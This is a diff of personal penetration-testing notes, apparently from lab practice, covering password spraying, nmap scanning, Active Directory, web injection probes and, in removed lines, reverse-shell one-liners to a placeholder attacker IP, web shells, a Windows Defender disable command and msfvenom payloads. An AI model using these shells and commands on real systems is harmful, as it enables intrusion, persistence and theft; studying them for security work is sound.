@@ -1,48 +1,74 @@
----
-title: Authentication
-tags: [Import-63f4]
-created: '2024-09-28T15:47:47.936Z'
-modified: '2025-01-08T10:26:41.719Z'
----
-
 # Authentication
 
-## General process
+## Password Spraying
 
-1. **Password Spraying**: 
-   - Empty authentication (Anonymous login)
-   - Default authentication: 
-     - Google: *service + default credentials*
-     - Web:
-       - admin
-       - user
-     - Linux:
-       - root (linux), 
-     - Windows:
-       - Guest
-       - Administrator
-   - Password: (*password*, same as username)
-   - Password reuse on other services
-   - Generate passwords with `pswgen`
+- **Tools**
 
-2. **Brute Forcing**
+  - Web        -> FFUF / Burpsuite Intruder / Patator
+  - Network -> Hydra / NXC / Legba
 
-   
+- **Weak Credentials**
 
-   
+  - Default
+
+    - `searchpass [app/service]`
+    - `/usr/share/seclists/Passwords/Default-Credentials` -> Services
+    - Default Usernames
+      - Linux       -> `root`
+      - Windows -> `Guest` / `Adminsitrator`
+      - Web         -> `admin` / `administrator`
+
+  - User = Password
+
+    ```bash
+    nxc [SERVICE] [IP] -u [USER.txt] -p [USER.txt] --no-bruteforce
+    ```
+
+    `--no-bruteforce` to go line by line
+
+  - Re-Used (also local auth)
+
+- **Password Generation**
+
+  - Web Applications    -> `pswgen [WEB_URL]`
+  - User Data                 -> `cupp -i` -> Input Data & Obtain Wordlist
+  - Wordlist Mutations
+    - Hashcat Mangling
+      - `/usr/share/hashcat/rules` -> Best64 / LeetSpeak / [Clem9669 Rules](https://github.com/clem9669/hashcat-rule/tree/master)
+      - `hashcat --stdout --rules-file [RULE_FILE] [PASS.txt] > [OUT]`
+    - Manually Change  -> Dates / ID Values / Timestamps 
+    - Password Policy    -> Character & Length Filtering
+    - [LDAP Harvesting](https://github.com/p0dalirius/pyLDAPWordlistHarvester?tab=readme-ov-file)   -> Requires valid LDAP Credentials
+
+- **Bruteforcing**
+
+  - Usernames
+    - `usergen() [FULL_NAMES.txt]`
+    - Wordlists:
+      - [Statistically Likely](https://github.com/insidetrust/statistically-likely-usernames) 
+      - `/usr/share/seclists/Usernames`  (Xato-Net / CIRT / `Names.txt`)
+    - Services though which usernames can be bruteforced
+      - SMTP / [OpenSSH < 7.7](https://github.com/Sait-Nuri/CVE-2018-15473) / Kerberos / [Solaris FTP](https://github.com/pentestmonkey/ftp-user-enum/blob/master/ftp-user-enum.pl) / Ident / Finger
+      - Web Login Responses (if in the response you get 'user doesn't exist)
+    
+  - Passwords
+    - Wordlists: `/usr/share/seclists/Passwords`
+    
+      Xato-Net / CIRT / Probable-V2 / Darkweb2017 / Rockyou
 
 ## Hash Cracking
 
 ### Cracking methods
 
-**Cracking:** `hashid` ->  [crackstation](https://crackstation.net/)
+- Identification:
 
-- `hashid` to identify the type of hash
+  - `hashid` 
+
+  - [crackstation](https://crackstation.net/)
 
 - john:
 
   ```bash
-  echo '[HASH1]\n[HASH@]' > hash.txt
   john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=15
   ```
 
@@ -84,12 +110,12 @@ john --show combined.txt
 
 ### Host Discovery
 
-Given one or more IP addresses, we want to see which ones are alive. To do this, we can use ICMP echo requests, and see which ones provide an ICMP reply to this. 
+Given one or more IP addresses, we want to see which ones are alive:
 
-**nmap options:**
+Send ICMP echo requests, and see if they reply with `nmap`
 
 ```bash
-$ sudo nmap [IP] -sn | grep for | cut -d" " -f5
+sudo nmap [IP] -sn | grep for | cut -d" " -f5
 ```
 
 This scanning method works only if the firewalls of the hosts allow it.
@@ -99,49 +125,37 @@ This scanning method works only if the firewalls of the hosts allow it.
   - range  `nmap [IP_start/IP_end]`
 
   - host list: `nmap -iL FILE`
-  - multiple ips [IP1] [IP2] ...
-
-- **`-sn`**: perform a "ping scan"  without performing a full port scan. 
-
-- **`-d" "`**: Specifies a space as the delimiter.
-
-- **`-f5`**: Tells `cut` to output the fifth field (word) from each line.
-
+  - multiple IPs [IP1] [IP2] ...
 - `-PE`:  Perform only *ICMP* ping scan. 
-
 - `--reason` Displays why an host is alive
-
 - `--packet-trace` Shows all packages sent and received
 
 ### Service scanning
 
-The **TCP-SYN scan** (`-sS`) is one of the default settings  unless we have defined otherwise and is also one of the most popular  scan methods. This scan method makes it possible to scan several  thousand ports per second. The TCP-SYN scan sends one packet with the  SYN flag and, therefore, never completes the three-way handshake, which  results in not establishing a full TCP connection to the scanned port.
-
-- If our target sends a `SYN-ACK` flagged packet back to us, Nmap detects that the port is `open`.
-- If the target responds with an `RST` flagged packet, it is an indicator that the port is `closed`.
-- If Nmap does not receive a packet back, it will display it as `filtered`. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall.
+The **TCP-SYN scan** (`-sS`), the default nmap scan, sends one packet with the  SYN flag and, therefore, never completes the three-way handshake. 
 
 #### **nmap options:**
 
-- `-sC` parameter to specify that `Nmap` scripts should be used to try and obtain more detailed information. Also runs some default scripts
+- **General:**
 
-- `-sV` show the versions (banner grabbing)
+  - `-sC` execute scripts
 
-- `-p-` all ports
+  - `-sV` show the versions
 
-- `--disable-arp-ping`: Disables ARP requests, so the scan doesn't switch to ARP requests when scanning local networks.
+  - `--version-all` (Try every single probe to determine the version)   
 
-- `-Pn` disable the ICMP echo requests 
+  - `--disable-arp-ping`: Disables ARP requests, so the scan doesn't switch to ARP requests when scanning local networks.
 
-- `-n` disable DNS resolution
+  - `-Pn` disable the ICMP echo requests 
 
-- `-A` aggressive scan
+  - `-n` disable DNS resolution
 
-- `--packet-trace` Shows all packages sent and received
+  - `-A` aggressive scan
 
-- `--version-trace` Show all version packages
+  - `--packet-trace` Shows all packages sent and received
 
-- `--version-all` (Try every single probe to determine the version)          
+  - `--version-trace` Show all version packages       
+
 
 - **protocols:**
 
@@ -167,7 +181,7 @@ The **TCP-SYN scan** (`-sS`) is one of the default settings  unless we have defi
 
 - `nmap --script <script name> -p <port> <host>` to run other scripts.
 
-  `--script "dns-* and discovery and not intrusive"`: this uses all the dns related scripts in the category discovery and not in the category intrusive. Here all the categories:
+  `--script "dns-* and discovery and not intrusive"` uses all the dns related scripts in the category discovery and not in the category intrusive. Here all the categories:
 
   - `auth` Determination of authentication credentials.
   - `broadcast` Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
@@ -184,20 +198,18 @@ The **TCP-SYN scan** (`-sS`) is one of the default settings  unless we have defi
   - `version` Extension for service detection.
   - `vuln` Identification of specific vulnerabilities.
 
-
-
 #### **nmap output**
 
-- **`open`:** Connection to the scanned port has been established. These connections can be **TCP connections**, **UDP datagrams** as well as **SCTP associations**.
+- **`open`:** Connection to the scanned port has been established (TCP, UDP or SCTP) 
 
   - If the UDP port is `open`, we only get a response if the application is configured to do so.
 
 - **`closed`:** 
 
-  - The TCP protocol indicates that the packet we received back contains an `RST` flag. 
-  - In the UDP scan, if we get an ICMP response with `error code 3` (port unreachable), we know that the port is indeed closed.
+  - For TCP, we got back a `RST` flag. 
+  - In UDP, only if we get an ICMP response with `error code 3` (port unreachable), we know that the port is indeed closed, otherwise is unreliable.
 
-- **`filtered`:** Nmap cannot correctly identify whether the scanned port is open or  closed because:
+- **`filtered`:** Nmap cannot say if the port is open/closed, because:
 
   - the package was *dropped*: Nmap receives no response, and by default will resend the request, by setting the retry rate (`--max-retries`) to 10. 
   - A *firewall* reject the package: As a response, we could get one of the following error messages:
@@ -208,21 +220,21 @@ The **TCP-SYN scan** (`-sS`) is one of the default settings  unless we have defi
     - Port Unreachable
     - Proto Unreachable
 
-- **`unfiltered`:** Nmap cannot correctly identify whether the scanned port is open or  closed because either *no response is returned* from the target for the  port or we get *an error code* from the target.
+- **`unfiltered`:** either *no response is returned* or an error code* is returned.
 
-- **`open|filtered`:** If we do not get a response for a specific port, `Nmap` will set it to that state. This indicates that a firewall or packet filter may protect the port.
+- **`open|filtered`:** a firewall or packet filter may protect the port.
 
-  - In UDP scan if the ICMP response was neither open nor closed, it will be marked as `open|filtered.
+  - In UDP scan if the ICMP response was neither open nor closed, it will be marked as `open|filtered`.
 
-- **`closed|filtered`:** This state only occurs in the **IP ID idle** scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.
+- **`closed|filtered`:** impossible to determine if the scanned port is closed or filtered by a firewall.
 
-- **`tcpwrapped`** it means that the behavior of the port is consistent with one that is  protected by tcpwrapper. Specifically, it means that a full TCP  handshake was completed, but the remote host closed the connection  without receiving any data. 
+- **`tcpwrapped`** the behavior of the port is consistent with one that is  protected by tcpwrapper, that is a full TCP  handshake was completed, but the remote host closed the connection  without receiving any data. 
 
   tcpwrapper protects *programs*, not ports. This means that a valid (not false-positive) `tcpwrapped` response indicates a real network service is available, but you are not on the list of hosts allowed to talk with it. When such a large number  of ports are shown as `tcpwrapped`, it is unlikely that they represent real services, so the behavior probably means something else.
 
 **Firewalls and IDS/IPS**
 
-Like the firewall, the intrusion detection system (`IDS`) and intrusion prevention system (`IPS`) are also software-based components. `IDS` scans the network for potential attacks, analyzes them, and reports any detected attacks. `IPS` complements `IDS` by taking specific defensive measures if a potential attack should have been detected, such as blocking the attacker's IP. Thus, from an attacker perspective, firewalls and IDS can be treated in the same way.
+Like firewalls, the intrusion detection system (`IDS`) and intrusion prevention system (`IPS`) are also software-based components. `IDS` scans the network for potential attacks, analyzes them, and reports any detected attacks. `IPS` complements `IDS` by taking specific defensive measures if an attack is detected, such as blocking the attacker's IP. Thus, from an attacker perspective, firewalls and IDS can be treated in the same way.
 
 Here some way to deal with them:
 
@@ -249,9 +261,9 @@ Here some way to deal with them:
 
 ### Version Fingerprinting
 
-Get as much information about server and network
+- **Banner grabbing** 
 
-- **Banner grabbing** is a useful technique to fingerprint a service quickly. Often a service will look to identify itself by displaying a banner  once a connection is initiated.
+  Often a service will look to identify itself by displaying a banner once connectioned
 
   - `-sV` and `--version-all` it is usually enough
 
@@ -301,9 +313,7 @@ Get as much information about server and network
 
 #### Generalities:
 
-**Type:** 
-
-Authentication, Read/Write
+**Type:** Authentication, Read/Write
 
 - Protocol:
 
@@ -311,7 +321,9 @@ Authentication, Read/Write
 
 - Active vs Passive mode:
 
-  A distinction is made between `active` and `passive` FTP. In the active variant, the client establishes the connection as  described via TCP port 21 and thus informs the server via which  client-side port the server can transmit its responses. However, if a  firewall protects the client, the server cannot reply because all  external connections are blocked. For this purpose, the `passive mode` has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the  connection in this method, the firewall does not block the transfer.
+  In the `active` variant, the client establishes the connection as  described via TCP port 21 and thus informs the server via which  client-side port the server can transmit its responses. However, if a  firewall protects the client, the server cannot reply because all  external connections are blocked. 
+
+  For this purpose, the `passive mode` has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the  connection in this method, the firewall does not block the transfer.
 
 - [List of FTP return codes](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes)
 
@@ -348,9 +360,7 @@ Authentication, Read/Write
   - LFI
   - with web servers, it is common that files are synchronized
 
-- sniffing with tcpdump could be possible
-
-- If the user are shown (i.e. the setting `hide_ids`, which makes all user and group information in directory listings will be displayed as "ftp", is set on NO)
+- sniffing with tcpdump 
 
 - Bounce attack
 
@@ -1902,55 +1912,6 @@ Once inside redis environment `info` return information about the  server
 - `keys *` List all the keys in the database
 - `get {key}`
 
-## Pivoting
-
-A way to access services that cannot be accessed by the outside
-
-- Ligolo: meno stealth di SSH ma piu comodo, doeesn't work on 32 bit
-- SSH: more stealth than Ligolo
-- chisel: Less stealth than ssh, but works on 32 bit
-
-#### Local forwarding
-
-Send a local service to your machine.
-
-```bash
-ssh -L [ATTACKER_PORT]:[INTRANET_IP]:[TARGET_PORT] [USER]@[IP] -fN
-```
-
-- `INTRANET_IP` is a private IP, usually 127.0.0.1
-- `-fN` to background the ssh terminal
-- `-L` can be specified multiple times
-
-#### Remote forwarding
-
-You open a server on your computer and send it to the target.
-
-#### Dynamic forwarding
-
-Access private subnetworks of the target.
-
-On the target machine, run `ifconfig` to see if there is a private network open.
-
-- **Ligolo**
-
-  1. To get the `CIDR` , note the corresponding IP of the interface with `ip route`
-  2. On your machine, run `ligstart` to start the ligolo server
-  
-  3. File transfer  the agent on the target from `TOOLS/ligolo-ng/dist`
-
-  4. On the target:
-
-     ```bash
-     ./agent -connect [TUNIP]:[LI] -ignore-cert
-     ```
-  
-     
-
-
-
-
-
 ## Active Directory
 
 It is a collection of machines, called *clients*, handled by the *domain controller (DC)*, which is a master server of one domain, thus it creates one (and only one) domain. 
@@ -1997,7 +1958,7 @@ There could be multiple DCs. A *trust escalation* is a privilege escalation in w
    GetNPUsers.py htb.local/ -usersfile user.txt -request -dc-ip 10.10.10.161 
    ```
 
-6. Dump and analyze th database
+6. Dump and analyze the database
 
    ```bash
     bloodhound-python -u svc-alfresco -p s3rvice -ns 10.10.10.161 --domain htb.local -c All --zip --dns-tcp
@@ -2005,7 +1966,7 @@ There could be multiple DCs. A *trust escalation* is a privilege escalation in w
 
    
 
-### nxc
+### NXC
 
 Generic tool to navigate all the authentication protocols. The guide: https://www.netexec.wiki/
 
@@ -2013,13 +1974,14 @@ Generic tool to navigate all the authentication protocols. The guide: https://ww
 
 To do *password spraying*, you can put a file instead of the username, with the most common ones, and using the `--continue-on-success` flag
 
-To enumerate the users, use th flag `--users` or `--active-users` for ldap.
+To enumerate the users, use the flag `--users` or `--active-users` for ldap.
 
 Possible protocols:
 
 	- ftp
 	- smb
 	- ssh
+	- ldap
 	- vnc
 	- rdp
 	- winrm
@@ -2090,7 +2052,6 @@ Parameters are very important to spot, and they are grouped in different categor
 
   - XXE
 
-
 `paramfuzz(query_url)` to fuzz get parameters
 
 ## Enumeration
@@ -2098,16 +2059,29 @@ Parameters are very important to spot, and they are grouped in different categor
 ### Fingerprinting
 
 - `web_enum [URL]`
-- Browser Extensions:
+
+- Firefox Extensions:
   - Wappalyzer
   - RetireJS
-  - Public Websites -> URLScan / WebCheck XYZ
+  
+- Page Content
+
+  - Component Names / Versions
+
+  - Open Source / Well-known Application
+
+  - HTML Source / JS Files Data
 
 ### Crawling
 
-- `Burp Suite Spider`
+- Burpsuite Default Crawler
 - `crawl [URL]`
-
+- Alive URLs / Parameters / Forms / User Functionalities
+- JS Files
+  - Credentials
+  - Endpoints
+  - Function Calls
+  - Hostnames / Usernames
 
 ### Discovery
 
@@ -2139,7 +2113,7 @@ Add found subdomains to `/etc/hosts` and scan recursively
 
 #### Directories and files
 
-Gbuster or Ffuf to discover hidden files or directories
+Fuzzing:
 
 ```bash
 dirfuzz [URL]
@@ -2147,7 +2121,7 @@ dirfuzz [URL]
 
 -  **HTTP status code** 
    -  `200`  request was successful
-   -  `403`  forbidden to access the resource.
+   -  `403`  forbidden to access the resource from the origin IP
    -  `301`  being redirected (not a failure case)
 
 **Important files:**
@@ -2161,7 +2135,7 @@ dirfuzz [URL]
 
 - `robots.txt`
 
-  It is common for websites to contain a `robots.txt` file,  whose purpose is to instruct search engine web crawlers bots which resources can and cannot be accessed for indexing. The `robots.txt` file can provide valuable information such as the location of private files and admin pages. 
+  It instructs search engine web crawlers bots which resources can and cannot be accessed for indexing. 
   
   `User-agent`: This line specifies which crawler or bot the following rules apply to. A wildcard (`*`) indicates that the rules apply to all bots. 
   
@@ -2240,37 +2214,32 @@ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 
 ## Exploitation
 
-### Proxy
-
-#### Host Misrouting
-
-How to, given a domain, reach other subdomains with the same IP address. Thus, we want to brute force the “etc/hosts” file of the proxy.
-
-After adding the domain to my `/etc/hosts` file:
-
-```bash
-gobuster vhost -u http://[DOMAIN] -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
-```
-
-Ignore any 400 Status output, since it means that the proxy refused your request.
-
-#### Log4j Injection
-
-Log4j is a Java library, which logs the User-Agent as a string and stores it. The vulnerability in this process is the  misinterpretation of the string
-
-Via the HTTP User-Agent header one can insert a JNDI lookup as a command intended for the Log4j library. Accordingly, not the actual User-Agent header, such as Mozilla 5.0, is processed, but the JNDI lookup.
-
 ### Server-side
 
-#### File Read
+**Test Files** to check if the vulnerability is there:
+
+- Linux: `"/etc/passwd"`
+- Windows file: `'file"///c:/windows/win.ini'`
+
+#### OS File Read
+
+**Directory traversal:**
+
+```
+page=../../../../../../../../windows/system32/drivers/etc/hosts
+```
 
 Linux:
 
-- `/etc/passwd`
+- `/etc/passwd`, `/etc/shadow`
 - ssh keys
 - web applications credentials
   - where does the application save the passwords?
-- Opened services 
+- Opened services
+
+Windows:
+
+- `WINDOWS\System32\drivers\etc\hosts`
 
 #### SQL Injections
 
@@ -2296,45 +2265,31 @@ Each time the user wants to log in, the web application sends the log-in page in
     sqlmap -u "http://[URL]?[QUERY]" -p [PARAM] search --dbs {--cookie=['COOKIE'] --dbms=[DATABASE]}--os-shell
     ```
 
+#### LFI / RFI
 
+LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application, like when an application uses the path to a file as input. 
 
-#### Local / Remote File Injection (LFI/RFI)
+We test the page parameter to see if we can include files on the target system in the server response, with common paths:
 
-LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. 
+-  [Windows](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt)
+- [Linux](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt)
 
-A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code execution as well.
+Functions vulnerable to LFI:
 
-We test the page parameter to see if we can include files on the target system in the server response. We
-will test with some commonly known files that will have the same name across networks, Windows
-domains, and systems which can be found [`here`](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt).
-
-One of the most common files that a penetration tester
-might attempt to access on a Windows machine to verify LFI is the hosts file,
-`WINDOWS\System32\drivers\etc\hosts` (this file aids in the local translation of host names to IP
-addresses). The ../ string is used to traverse back a directory, one at a time. Thus multiple ../ strings are
-included in the URL so that the file handler on the server traverses back to the base directory i.e. C:\
-
-```
-page=../../../../../../../../windows/system32/drivers/etc/hosts
-```
-
-For instance, the file inclusion can be made possible because in the backend the `include()` method of PHP is
-being used.
-
-In Linux, there is the `/etc/passwd` file.
+- php: `include()`
 
 For a **RFI** you load the file remotely, e.g. though a server.
 
-#### XML Eternal Entities (XXE or XEE)
+#### XXE Injection
 
-*XML* is a markup language  and file format for storing, transmitting, and reconstructing arbitrary data.  Although the design of XML focuses on documents, the language is widely used for the representation of arbitrary data structures, such as those used in web services.
+*XML* is a markup language  and file format for storing, transmitting, and reconstructing arbitrary data. 
 
 *XML Entities* are a way of representing an item of data within an XML
-document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities `&lt;` and `&gt;` represent the characters < and > .
+document, instead of using the data itself. E.g., `&lt;` and `&gt;` represent < and > .
 
 An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. Note that a parser transforms raw data into a structured format.
 
-Using Burpsuit responder, one can try to read a file to check if the XXE vulnerability is indeed possible:
+Burpsuit responder: 
 
 ```php
 <!--?xml version="1.0" ?-->
@@ -2342,37 +2297,37 @@ Using Burpsuit responder, one can try to read a file to check if the XXE vulnera
 <data>&example;</data>
 ```
 
-- FILE:
-  - Linux: `"/etc/passwd"`
-  - Windows file: `'file"///c:/windows/win.ini'`
 - data: vulnerable parameter, the *reflected* one.
 
+#### OS Injection (command injection)
 
+If in the backend, when you send a request though a parameter, this gets processed through a linux command, it could be vulnerable to executing multiple commands, like `&&` or `;`.
 
-#### Template Injection SSTI
+Some examples:
 
-**Template Engines** are used to display dynamically generated content on a web page. They replace the
-variables inside a template file with actual values and display these values to the client.
+- If the parameter is printing a file from the a local system, it has to save the file in www.data for it to be able to display it. 
 
-**Server-side template injection** is a vulnerability where the attacker injects malicious input into a template in order
-to execute commands on the server.
+  Thus, in the backend it will do something like `cat $1 > out.txt` and the command injection while be: `/etc/passwd; whoami; #`
 
-#### Identification of the template engine
+#### SSTI 
+
+**Template Engines** are used to display dynamically generated content on a web page. They replace the variables inside a template file with actual values and display these values to the client.
+
+**Server-side template injection** is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server.
 
 ![image-20240922190834802](/home/damuna/.config/Typora/typora-user-images/image-20240922190834802.png)
 
-special characters commonly used in
-template expressions:
+If an SSTI exists, after submitting one of these:
+
 `{{7*7}}`
 `${7*7}`
 `<%= 7*7 %>`
 `${{7*7}}`
 `#{7*7}`
 
-Some of these payloads can also be seen in the previous image and are used to identify SSTI vulnerabilities.
-If an SSTI exists, after submitting one of them, the web server will detect these expressions as valid code
-and attempt to execute them, in this instance calculating the mathematical equation 7*7, which is equal to 49.
-Even if the code is not directly executed, an error message can indicate what is the engine used. <then, go to Hacktrix.
+the web server will detect these expressions as valid code and attempt to execute them, in this instance calculating the mathematical equation 7*7, which is equal to 49.
+
+An error message can indicate what is the engine used, one can then perform research on how to exploit the particular template.
 
 ### Client-side
 
@@ -2380,9 +2335,7 @@ Even if the code is not directly executed, an error message can indicate what is
 
 ##### Type Juggling
 
-PHP type juggling vulnerability occurs when a loose comparison operator  (== or!=) is used in the place of a strict comparison operator (===  or!==) in a situation where the attacker has access to one of the  variables being compared. 
-
-This vulnerability may cause the application to provide an unexpected  true or false response and may result in serious authorization and/or  authentication problems. 
+PHP type juggling vulnerability occurs when a loose comparison operator  (== or!=) is used in the place of a strict comparison operator (===  or!==). 
 
 ![image-20241021201733300](/home/damuna/.config/Typora/typora-user-images/image-20241021201733300.png)
 
@@ -2393,7 +2346,7 @@ if (strcmp($username , $_POST['username']) == 0) {
 	if (strcmp($password, $_POST['password']) == 0) {
 ```
 
-To exploit it, one can change the POST data of the web request using BurpSuit in an empty array, since If we convert those variables into empty arrays ( `$username[] & $password[] `), the comparison will return NULL , and NULL == 0 will return true, causing the login to be successful.
+To exploit it, one can change the POST data of the web request in an empty array, since If we convert those variables into empty arrays ( `$username[] & $password[]`), the comparison will return NULL , and NULL == 0 will return true, causing the login to be successful.
 
 #### XSS 
 
@@ -2411,369 +2364,9 @@ To exploit it, one can change the POST data of the web request using BurpSuit in
   - [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) (also known as persistent or second-order XSS) arises when an  application receives data from an untrusted source and includes that  data within its later HTTP responses in an unsafe way.        
   - [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) (also known as [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)) arises when an application contains some client-side JavaScript that  processes data from an untrusted source in an unsafe way, usually by  writing the data back to the DOM.        
 
-#  Shells
+#  Files & shells
 
-[ReverseShellGenerator](https://www.revshells.com/)
-
-## Reverse Shell
-
-With a `reverse shell`, the attack box will have a listener running, and the target will need to initiate the connection.
-
-You want to use a [common port](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/ch-ports#ch-ports) like `443` which usually is for `HTTPS` connections, so that it does not  get blocked by firewalls.
-
-### Firewall evasion Windows
-
-- Disable Windows Defender antivirus (AV)
-
-  ```powershell
-   Set-MpPreference -DisableRealtimeMonitoring $true
-  ```
-
-
-## Bind Shell
-
-The `target` system has a listener started and the attacker directly connects to that port. So, there needs to be a lister opened or that we can start. Bind shells rely on incoming connections allowed through the firewall on the server-side, which is not common.
-
-We can use `netcat` to connect to that port and get a connection to the shell. Unlike a `Reverse Shell`, if we drop our connection to a bind shell for any reason, we can connect back to it and get another  connection immediately. However, if the bind shell command is stopped  for any reason, or if the remote host is rebooted, we would still lose  our access to the remote host and will have to exploit it again to gain  access.
-
-1. Bind a bash shell on the target (payload)
-
-   ```bash
-   rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
-   ```
-
-2. On your machine, connect though netcat
-
-   ```bash
-   nc -nv [IP] [PORT]
-   ```
-
-   
-
-## Web Shell
-
-A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.
-
-`/usr/share/laudanum` includes injectable files for many different web application languages.
-
-You may run into some implementations that randomize filenames on upload.
-
-### Writing a Web Shell
-
-**Code: php**
-
-```php
-<?php system($_REQUEST["cmd"]); ?>
-```
-
- [WhiteWinterWolf's PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
-
-**Code: jsp**
-
-```jsp
-<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
-```
-
-**Code: asp**
-
-```asp
-<% eval request("cmd") %>
-```
-
-### Uploading a Web Shell
-
-Now we have to write one of the web shells above in the web root
-
-| Web Server | Default Webroot        |
-| ---------- | ---------------------- |
-| `Apache`   | /var/www/html/         |
-| `Nginx`    | /usr/local/nginx/html/ |
-| `IIS`      | c:\inetpub\wwwroot\    |
-| `XAMPP`    | C:\\xampp\htdocs\      |
-
-We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. 
-
-#### Bypassing File Type restrictions
-
-
-
-### Accessing the Web Shell
-
-Once we write our web shell, we can either access it through a browser or by using `cURL`. 
-
-- We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:
-
-- ```bash
-  curl http://SERVER_IP:PORT/shell.php?cmd=id
-  ```
-
-
-
-Benefits:
-
-- It would bypass any firewall  restriction in place, as it will not open a new connection on a port 
-- If the compromised host is rebooted, the web shell would still be in place,  and we can access it and get command execution without exploiting the  remote host again.
-
-Contra:
-
-- Not as interactive
-
-## Payloads
-
-`Staged` payloads create a way for us to send over more components of our attack
-
-Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a `stageless` payload. Stageless payloads can sometimes be better for evasion purposes.
-
-### One liners
-
-- **Netcat/Bash**
-
-  ```
-  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [YOUR_IP] [PORT] > /tmp/f
-  ```
-
-- **Poweshell**
-
-  ```powershell
-  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[YOUR IP]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-  ```
-
-- **Bash**
-
-  ```bash
-  /bin/sh -i
-  ```
-
-  Copies bash, give SUID priviliges,
-
-  ```bash
-  echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/exp\nchmod 4777 /tmp/exp' > file_to_execute
-  ```
-
-  - Perl:
-
-    ```bash
-    perl —e 'exec "/bin/sh";'
-    ```
-
-  - Same for ruby or lua
-
-  - AWK
-
-    ```bash
-    awk 'BEGIN {system("/bin/sh")}'
-    ```
-
-  - Vim
-
-    ```bash
-    vim -c ':!/bin/sh'
-    ```
-
-    
-
-- **MSFvenom**
-
-  ```bash
-  # List payloads
-  msfvenom -l payloads
-  
-  # Build a stageless payload (-f to specify the format)
-  msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT=444 -f elf > createbackup.elf
-  ```
-
-  
-
-### Windows 
-
-#### Types of payloads
-
-- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library): library file to provide shared code and data that can be used by different programs at once. Can elevate our privileges to SYSTEM and/or bypass User  Account Controls.
-
-- [Batch](https://commandwindows.com/batch.htm): text-based DOS scripts (`.bat` extension) utilized by system administrators to complete multiple tasks through the command-line interpreter.  We can use batch files to run commands on the host in an automated fashion. 
-
-- [VBS](https://www.guru99.com/introduction-to-vbscript.html): scripting language typically used as a client-side scripting language  in webservers to enable dynamic web pages. Now outdated, it is used in phishing attacks.
-
-- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) When attempting to install a new application, the installer will look for the `.msi` file. Once we loaded the payload, we can run `msiexec` to execute our file.
-
-- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1): shell environment and scripting language.
-
-#### Resources
-
-- MSFVenom
-- [Alternative to metasploit](https://github.com/its-a-feature/Mythic)
-- [PayloafAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
-- [Nishang ](https://github.com/samratashok/nishang) is a framework collection of Offensive PowerShell implants and  scripts. 
-- [Darkarmour](https://github.com/bats3c/darkarmour) is a tool to generate and utilize obfuscated binaries for use against Windows hosts.
-- [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built-in Python that provides us a way to interact with  network protocols directly. Some of the most exciting tools we care  about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
-
-### LinuxExploit
-
-
-
-### TTY Upgrade
-
-Once we connect to a shell through Netcat, we will notice that we can  only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the  command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.
-
-It could happen that the history of the shell is empty if the upgrade is not performed, and the history could contain important information, such as passwords.
-
-#### General method
-
-```bash
-script -qc /bin/bash /dev/null
-```
-
-#### python/stty method
-
-```bash
-# In reverse shell
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'	#usually good enough
-Ctrl-Z	# Go to my Kali
-
-# In Kali
-$ stty raw -echo
-$ fg	# Go to shell
-
-# In reverse shell
-$ reset
-$ export SHELL=bash
